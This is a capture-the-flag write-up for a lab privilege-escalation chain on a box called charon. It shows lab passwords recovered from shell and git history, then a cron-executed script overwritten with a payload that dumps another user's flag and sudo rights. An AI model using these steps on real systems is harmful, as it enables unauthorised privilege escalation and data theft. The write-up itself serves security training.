# On Schedule (200 pts) — writeup

> **gh0st404 maintains a nightly collector script on charon. Somebody else's account
> runs it on a schedule. Use that to become the next user and read their flag.**

**Flag:** `deadface{cr0n_c4rr13d_my_p4yl04d}` (reads "cron carried my payload")
**Next user reached:** `sunstalker` (uid 1004)

---

## 1. What the box gives you

```
$ grep -r sunstalker /etc/cron.d/ 2>/dev/null
/etc/cron.d/charon-collect:
# charon collector: runs as sunstalker; script is maintained by gh0st404
* * * * * sunstalker /opt/scrape/collect.sh

$ ls -la /opt/scrape/
-rwxr-xr-x 1 gh0st404 gh0st404 147 Oct 18 01:14 collect.sh
```

`collect.sh` bleeds its own vulnerability in the comment: it is **owned by gh0st404
but executed as sunstalker** every single minute. Whoever can write that file gets
arbitrary code execution **as sunstalker** within ~60 seconds.

## 2. Getting to gh0st404

`gh0st404` is not a user we start as, and its password is nowhere obvious. The chain:

1. **Start:** `svc-deploy` (the ttyd web shell). The Looking Back challenge already
   gives `su - deephax` (password `Sk4t3rB0y_S1nce_2011`, leaked shell history).
2. **deephax's git repo** `~/kingmaker-scraper` contains the leak. The latest commit
   says one thing, history says another:

   ```
   $ git log --oneline
   b014c26 move service pw out of source into env     <- "secure"
   49df4e8 initial scraper + service config            <- oops

   $ git show 49df4e8 -- config.py
   + SERVICE_USER = "gh0st404"
   + SERVICE_PW = "Gh0stInTh3Sh3ll_404"              <- still in git history
   ```

   `git` never forgets: the "fix" only removed the secret from the working tree.

3. `su - gh0st404` with `Gh0stInTh3Sh3ll_404` — and we own `collect.sh`
   (`whoami` → `gh0st404`).

## 3. The hijack

Back up the original, plant a payload that dumps whatever we want (cron runs it as
**sunstalker**, so it can read sunstalker's private home):

```bash
cp /opt/scrape/collect.sh /tmp/collect.sh.orig

cat > /opt/scrape/collect.sh <<'EOF'
#!/bin/sh
{
  id
  cat /home/sunstalker/flag.txt
  sudo -n -l
  ls -la /home/
} > /tmp/sunstalker_dump.txt 2>&1
chmod 666 /tmp/sunstalker_dump.txt
EOF
chmod 755 /opt/scrape/collect.sh
```

…wait ≤ 60 s for the `* * * * *` tick, then as gh0st404:

```bash
cat /tmp/sunstalker_dump.txt
```

Output:

```
uid=1004(sunstalker) gid=1004(sunstalker)
deadface{cr0n_c4rr13d_my_p4yl04d}
User sunstalker may run the following commands on charon:
    (lilith) NOPASSWD: /usr/bin/find        <- the Lilith challenge, next stage
```

## 4. Notes / dead ends

- `collect.sh` **must stay executable and keep a `#!/bin/sh` shebang** — cron execs it
  directly; a non-executable or shebang-less file just fails silently.
- **Each ttyd WebSocket session spawns a fresh box instance.** A payload planted in one
  session is NOT visible in the next — plant AND wait AND read within one session
  (my `chain2_sunstalker.py` / `chain3_lilith.py` do exactly that).
- The box 502s intermittently (nginx up, spawn backend down); that is infrastructure,
  not the exploit path failing.
- Manual shells send `su`'s password as keystrokes — you cannot paste it (see
  `writeup-dangerous-capability.md` notes).

## 5. Automated

```bash
python chain2_sunstalker.py   # su gh0st404 -> plant -> wait for cron -> dump
python watch_box.sh           # background: runs chain3 (lilith stage) when the box returns
```
